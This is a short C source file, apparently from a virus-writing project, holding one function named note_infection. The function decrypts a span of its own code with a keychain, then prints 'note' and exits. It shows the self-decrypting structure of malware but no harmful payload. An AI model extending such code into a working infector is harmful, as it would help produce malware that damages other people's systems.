#include <war.h>

////////////////////////////////////////////////////////////////////////////////
/// PUBLIC FUNCTION
////////////////////////////////////////////////////////////////////////////////

void note_infection(struct s_host *host, struct s_keychain *keychain)
{
	decrypt_left(keychain, (char *)text_infection, (void *)note_infection - (void *)text_infection);

	(void)host;
	(void)keychain;

	printf("note\n");
	exit(0);
}
